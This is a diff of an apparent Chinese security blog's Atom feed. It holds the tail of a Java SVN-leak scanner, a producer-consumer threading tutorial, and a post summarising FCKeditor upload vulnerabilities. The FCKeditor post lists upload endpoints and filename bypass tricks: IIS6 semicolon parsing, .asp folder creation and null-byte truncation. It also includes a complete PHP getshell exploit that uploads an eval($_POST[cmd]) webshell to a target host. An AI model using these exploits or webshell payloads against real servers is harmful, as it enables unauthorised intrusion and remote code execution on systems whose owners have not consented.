+            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (((httpURLConnection.getResponseCode() == &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;)||(httpURLConnection.getResponseCode() == &lt;span class=&quot;number&quot;&gt;403&lt;/span&gt;)||(httpURLConnection.getResponseCode() == &lt;span class=&quot;number&quot;&gt;404&lt;/span&gt;))) {
+                &lt;span class=&quot;comment&quot;&gt;//获取返回内容    &lt;/span&gt;
+                InputStream &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;
+                InputStreamReader inr = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;
+                BufferedReader reader = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;
+                StringBuffer resultBuffer = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; StringBuffer();
+                String tempLine = &lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;;
+                 &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;{
+                 &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; = httpURLConnection.getInputStream();
+                 &lt;span class=&quot;comment&quot;&gt;//先对数据流进行utf-8转码，解决乱码&lt;/span&gt;
+                 inr = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; InputStreamReader(&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;);
+                 reader = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; BufferedReader(inr);
+                 &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;((tempLine = reader.readLine())!=&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;){
+                     &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(tempLine.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;ir&quot;&lt;/span&gt;)&amp;gt;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;amp;&amp;amp;tempLine.length()&amp;lt;&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;){
+                         WriteToFile.fWriter(&lt;span class=&quot;string&quot;&gt;&quot;C:/Users/Administrator/Desktop/svnSuccess.txt&quot;&lt;/span&gt;, url);
+                         &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+                     }
+                 }
+                 }&lt;span class=&quot;keyword&quot;&gt;finally&lt;/span&gt;{
+                 &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(reader!=&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;){
+                 reader.close();
+                 }
+                 &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inr!=&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;){
+                 inr.close();
+                 }
+                 &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;!=&lt;span class=&quot;literal&quot;&gt;null&lt;/span&gt;){
+                 &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;.close();
+                 }
+                 }
+            }
+            &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;{
+            }
+        } &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (IOException e) {
+        }
+
+        }
+    }
+
+}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本文由HackBraid整理总结，如需转载请注明出处。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_背景&quot;&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;引上一篇博文，对于多线程程序来说，不管任何编程语言，生产者和消费者模型都是最经典的。就像学习每一门编程语言你首先要输出Hello World一样，都是经典的例子。这里使用queue队列作为仓储，将生产者和消费者联系起来并模拟实现一个多线程提取SVN信息泄露漏洞的程序。&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/svn.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="编程开发" scheme="http://hackbraid.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="JAVA" scheme="http://hackbraid.github.io/tags/JAVA/"/>
+    
+      <category term="SVN" scheme="http://hackbraid.github.io/tags/SVN/"/>
+    
+      <category term="多线程" scheme="http://hackbraid.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Java基于queue的多线程模拟生产者消费者问题</title>
+    <link href="http://hackbraid.github.io/2015/09/23/producerconsumer/"/>
+    <id>http://hackbraid.github.io/2015/09/23/producerconsumer/</id>
+    <published>2015-09-23T07:30:00.000Z</published>
+    <updated>2015-12-17T07:56:26.792Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_并发协作（生产者消费者模型）&quot;&gt;0x01 并发协作（生产者消费者模型）&lt;/h2&gt;&lt;p&gt;对于多线程程序来说，不管任何编程语言，生产者和消费者模型都是最经典的。就像学习每一门编程语言你首先要输出Hello World一样，都是经典的例子。&lt;br&gt;生产者消费者模型准确的讲应该是”生产者-消费者-仓储”模型，离开了仓储这个介质，生产者和消费者也就没有了必然的联系。&lt;br&gt;这里使用queue队列作为仓储，将生产者和消费者联系起来并模拟实现一个简单的多线程并发协作的模型&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/6.JPG&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_基于Queue的生产者消费者模型实现&quot;&gt;0x02 基于Queue的生产者消费者模型实现&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;package com.thread;
+
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.LinkedBlockingQueue;
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * java基于queue多线程来模拟生产者消费者问题
+ * 
+ * ProducerConsumer是主类，Producer生产者，Consumer消费者，Queue是商品
+ * 
+ * @author braid
+ * @time 2015-09-23
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; ProducerConsumer {
+&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String[] args)&lt;/span&gt; &lt;/span&gt;{
+    ProducerConsumer pc = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ProducerConsumer();
+    BlockingQueue&amp;lt;String&amp;gt; &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LinkedBlockingQueue&amp;lt;String&amp;gt;(&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);
+    ExecutorService service = Executors.newCachedThreadPool();
+    Producer p = pc.new Producer(&lt;span class=&quot;string&quot;&gt;&quot;王一&quot;&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;);
+    Consumer c = pc.new Consumer(&lt;span class=&quot;string&quot;&gt;&quot;李二&quot;&lt;/span&gt;, &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;);
+    service.submit(p);
+    service.submit(c);
+}
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * 消费者
+ * 
+ * @author braid
+ * @time 2015-09-23
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; Consumer extends Thread {
+    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; String name;
+    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; BlockingQueue&amp;lt;String&amp;gt; &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; = null;
+
+    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Consumer&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String name, BlockingQueue&amp;lt;String&amp;gt; &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.name = name;
+        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; = &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;;
+    }
+
+    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) {
+            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;.isEmpty())
+                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;
+            String product;
+            &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; {
+                product = &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;.take();
+                System.out.println(name + &lt;span class=&quot;string&quot;&gt;&quot;消费商品：&quot;&lt;/span&gt; + product);
+                Thread.sleep(&lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;);
+            } &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (InterruptedException e) {
+                &lt;span class=&quot;comment&quot;&gt;// TODO Auto-generated catch block&lt;/span&gt;
+                e.printStackTrace();
+            }
+
+        }
+    }
+}
+
+&lt;span class=&quot;comment&quot;&gt;/**
+ * 生产者
+ * 
+ * @author braid
+ * @time 2015-09-23
+ */&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; Producer extends Thread {
+    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; String name;
+    &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; BlockingQueue&amp;lt;String&amp;gt; &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; = null;
+
+    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Producer&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(String name, BlockingQueue&amp;lt;String&amp;gt; &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.name = name;
+        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.&lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt; = &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;;
+    }
+
+    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;{
+        &lt;span class=&quot;comment&quot;&gt;//while(true)会造成阻塞，应该根据实际需要设定条件&lt;/span&gt;
+        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;) {
+            String product = &lt;span class=&quot;string&quot;&gt;&quot;product&quot;&lt;/span&gt; + (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)(Math.random()*&lt;span class=&quot;number&quot;&gt;10000&lt;/span&gt;);
+            &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt; {
+                &lt;span class=&quot;built_in&quot;&gt;queue&lt;/span&gt;.put(product);
+                System.out.println(name + &lt;span class=&quot;string&quot;&gt;&quot;已生产：&quot;&lt;/span&gt; + product);
+                Thread.sleep(&lt;span class=&quot;number&quot;&gt;500&lt;/span&gt;);
+            } &lt;span class=&quot;keyword&quot;&gt;catch&lt;/span&gt; (InterruptedException e) {
+                &lt;span class=&quot;comment&quot;&gt;// TODO Auto-generated catch block&lt;/span&gt;
+                e.printStackTrace();
+            }
+        }
+    }
+}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本文由HackBraid整理总结，如需转载请注明出处。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01_并发协作（生产者消费者模型）&quot;&gt;0x01 并发协作（生产者消费者模型）&lt;/h2&gt;&lt;p&gt;对于多线程程序来说，不管任何编程语言，生产者和消费者模型都是最经典的。就像学习每一门编程语言你首先要输出Hello World一样，都是经典的例子。&lt;br&gt;生产者消费者模型准确的讲应该是”生产者-消费者-仓储”模型，离开了仓储这个介质，生产者和消费者也就没有了必然的联系。&lt;br&gt;这里使用queue队列作为仓储，将生产者和消费者联系起来并模拟实现一个简单的多线程并发协作的模型&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/6.JPG&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="编程开发" scheme="http://hackbraid.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
+    
+    
+      <category term="JAVA" scheme="http://hackbraid.github.io/tags/JAVA/"/>
+    
+      <category term="多线程" scheme="http://hackbraid.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
+    
+      <category term="生产者消费者" scheme="http://hackbraid.github.io/tags/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>FCKeditor上传漏洞总结</title>
+    <link href="http://hackbraid.github.io/2015/07/09/fckeditor/"/>
+    <id>http://hackbraid.github.io/2015/07/09/fckeditor/</id>
+    <published>2015-07-09T02:39:50.000Z</published>
+    <updated>2015-12-17T07:56:05.311Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01_FCKeditor简介&quot;&gt;0x01 FCKeditor简介&lt;/h2&gt;&lt;p&gt;FCKeditor是一个专门使用在网页上属于开放源代码的所见即所得文字编辑器。它志于轻量化，不需要太复杂的安装步骤即可使用。它可和PHP、 JavaScript、ASP、ASP.NET、ColdFusion、Java、以及ABAP等不同的编程语言相结合。“FCKeditor”名称中的 “FCK” 是这个编辑器的作者的名字Frederico Caldeira Knabben的缩写。FCKeditor 相容于绝大部分的网页浏览器，像是 : Internet Explorer 5.5+ (Windows)、Mozilla Firefox 1.0+、Mozilla 1.3+ 和 Netscape 7+。在未来的版本也将会加入对 Opera 的支援。&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x02_判断版本&quot;&gt;0x02 判断版本&lt;/h2&gt;&lt;p&gt;常见判断版本方法有两个：&lt;br&gt;/fckeditor/editor/dialog/fck_about.html&lt;br&gt;/FCKeditor/_whatsnew.html&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;0x03_上传地址&quot;&gt;0x03 上传地址&lt;/h2&gt;&lt;h3 id=&quot;常用的上传地址A&quot;&gt;常用的上传地址A&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;amp;Type=Image&amp;amp;CurrentFolder=/&lt;br&gt;FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;amp;connector=connectors/asp/connector.asp&lt;br&gt;FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;amp;Connector=&lt;a href=&quot;http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php&lt;/a&gt; (ver:2.6.3 测试通过)&lt;br&gt;FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;amp;Connector=connectors/jsp/connector.jsp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&quot;常用的上传地址B&quot;&gt;常用的上传地址B&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;FCKeditor/editor/filemanager/browser/default/connectors/test.html&lt;br&gt;FCKeditor/editor/filemanager/upload/test.html&lt;br&gt;FCKeditor/editor/filemanager/connectors/test.html&lt;br&gt;FCKeditor/editor/filemanager/connectors/uploadtest.html &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;0x04_上传方法&quot;&gt;0x04 上传方法&lt;/h2&gt;&lt;h3 id=&quot;ASP版&quot;&gt;ASP版&lt;/h3&gt;&lt;p&gt;asp一般是搭在windows主机上，webserver一般为IIS6/IIS7/IIS7.5。据我现在所知，asp版的fckeditor已经可以全秒了。&lt;/p&gt;
+&lt;p&gt;&amp;lt;2.4.x版本（也就是2.4.x及以下）的File参数时为黑名单验证，可以通过上传.asa、.cer、.asp;jpg（针对IIS6）。如果asa、cer不被解析，还可以传.asp[空格]。传的方法就是抓包然后在数据包里的文件名后填个空格。&lt;/p&gt;
+&lt;p&gt;2.5.x和2.6.x：如果是IIS6.0 ，可以通过突破变”.”为”_”限制创建.asp文件夹，代码如下：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;amp;Type=File&amp;amp;CurrentFolder=%2Fshell.asp&amp;amp;NewFolderName=z.asp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;复制代码然后往这个文件夹里传jpg，这个不多说了。&lt;/p&gt;
+&lt;p&gt;如果是IIS7及以上，这种方法就傻逼了。这个时候可以借助刚爆出来的那种方法，先传shell.asp%00txt，然后再传一次。&lt;/p&gt;
+&lt;p&gt;至此，asp版本已经全秒了。&lt;/p&gt;
+&lt;h3 id=&quot;ASPX版&quot;&gt;ASPX版&lt;/h3&gt;&lt;p&gt;低版本同ASP版，2.6.x用刚爆出来的二次上传已经不好使了，不过新建test.asp的文件夹还可以使。一般IIS6.0会支持asp，可以先传个asp上去，然后再XX。&lt;/p&gt;
+&lt;h3 id=&quot;PHP版&quot;&gt;PHP版&lt;/h3&gt;&lt;p&gt;1.低版本（2.4.x及以下），仍然为黑名单验证，windows主机可以使用php[空格]传，2.4.3的有个media未设置导致任意文件上传可以秒linux。&lt;/p&gt;
+&lt;p&gt;2.2.5.x以后是白名单验证，仅能寄希望于wooyun里爆的那个&amp;lt;2.6.4的任意文件上传，成功率有限。&lt;/p&gt;
+&lt;p&gt;3.2.6.4以上的php版，据我所知没戏，求高人指点！我粗略的看了一下它的验证逻辑，表示没戏，windows里的敏感字符全给过滤了。&lt;/p&gt;
+&lt;h2 id=&quot;0x05_实战案例&quot;&gt;0x05 实战案例&lt;/h2&gt;&lt;h3 id=&quot;【aspx+2-6-4】&quot;&gt;【aspx+2.6.4】&lt;/h3&gt;&lt;p&gt;1.上传地址：&lt;a href=&quot;http://***/FCKeditor/_samples/default.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://***/FCKeditor/_samples/default.html&lt;/a&gt;&lt;br&gt;2.上传shell.asp;.jpg变shell_asp;.jpg，然后继续上传同名文件可变为shell.asp;(1).jpg&lt;br&gt;3.shell地址：&lt;a href=&quot;http://***/userfiles/shell.asp;(1).jpg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://***/userfiles/shell.asp;(1).jpg&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;【PHP+2-4-3】&quot;&gt;【PHP+2.4.3】&lt;/h3&gt;&lt;p&gt;1.Linux服务器，利用media未设置导致任意文件上传，测试POC为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+print_r(&lt;span class=&quot;string&quot;&gt;&#39;
+      +--------------------------------------------------------------+
+                  NS-ASG Getshell  Exploit
+      +--------------------------------------------------------------+
+&#39;&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;variable&quot;&gt;$argc&lt;/span&gt; &amp;lt; &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) {
+      print_r(&lt;span class=&quot;string&quot;&gt;&#39;
+      +--------------------------------------------------------------+
+                  Example:
+                  php &#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$argv&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].&lt;span class=&quot;string&quot;&gt;&#39; localhost
+      +--------------------------------------------------------------+
+      &#39;&lt;/span&gt;);
+      exit;
+}
+&lt;span class=&quot;variable&quot;&gt;$host&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$argv&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];
+&lt;span class=&quot;variable&quot;&gt;$file&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;index.php&#39;&lt;/span&gt;;
+&lt;span class=&quot;variable&quot;&gt;$path&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;/admin/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;&lt;/span&gt;;
+&lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;https://&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$host&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$path&lt;/span&gt;;
+&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt; = fopen(&lt;span class=&quot;string&quot;&gt;&quot;$file&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;w&quot;&lt;/span&gt;) or die(&lt;span class=&quot;string&quot;&gt;&#39;can not write&#39;&lt;/span&gt;);
+fwrite(&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;?php phpinfo();eval(\$_POST[cmd]);?&amp;gt;&quot;&lt;/span&gt;);
+fclose(&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;NewFile&#39;&lt;/span&gt;=&amp;gt;&lt;span class=&quot;string&quot;&gt;&#39;@&#39;&lt;/span&gt;. dirname(__FILE_&lt;span class=&quot;number&quot;&gt;_&lt;/span&gt;).&lt;span class=&quot;string&quot;&gt;&quot;/$file&quot;&lt;/span&gt;);
+    &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt; = curl_init(); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_URL, &lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt; ); // 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_SSL_VERIFYPEER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_SSL_VERIFYHOST, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_USERAGENT, &lt;span class=&quot;string&quot;&gt;&quot;Mozilla/4.0&quot;&lt;/span&gt; ); 
+    @curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_FOLLOWLOCATION, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_AUTOREFERER, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_POST, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_POSTFIELDS, &lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; ); 
+
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ); 
+    curl_setopt ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; );
+    &lt;span class=&quot;variable&quot;&gt;$tmpInfo&lt;/span&gt; = curl_exec ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt; ); 
+    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (curl_errno ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt; )) {
+        echo &lt;span class=&quot;string&quot;&gt;&#39;Errno&#39;&lt;/span&gt; . curl_error ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt; );
+    }
+    curl_close ( &lt;span class=&quot;variable&quot;&gt;$curl&lt;/span&gt; );
+    //echo &lt;span class=&quot;variable&quot;&gt;$tmpInfo&lt;/span&gt;;    
+    preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/201,\&quot;(.*)\&quot;,\&quot;/iU&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$tmpInfo&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$matchs&lt;/span&gt;);
+    &lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&#39;https://&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$host&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$matchs&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];
+    print &lt;span class=&quot;string&quot;&gt;&#39;Shell: &#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$url&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;   password: cmd&#39;&lt;/span&gt;;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.利用方式：php.exe 1.php 202.ip.ip.ip&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h3 id=&quot;【JSP+2-2】&quot;&gt;【JSP+2.2】&lt;/h3&gt;&lt;p&gt;1.利用00截断上传，地址如下：&lt;br&gt;&lt;a href=&quot;http://***/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;amp;Connector=connectors/jsp/connector&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://***/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;amp;Connector=connectors/jsp/connector&lt;/a&gt;&lt;br&gt;2.上传后抓包并添加00截断如下：&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f4.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;3.shell地址：&lt;a href=&quot;http://***/UserFiles/Image/x.jsp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://***/UserFiles/Image/x.jsp&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;http://7xk8bu.com1.z0.glb.clouddn.com/f5.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;本文由HackBraid整理总结，如需转载请注明出处。&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
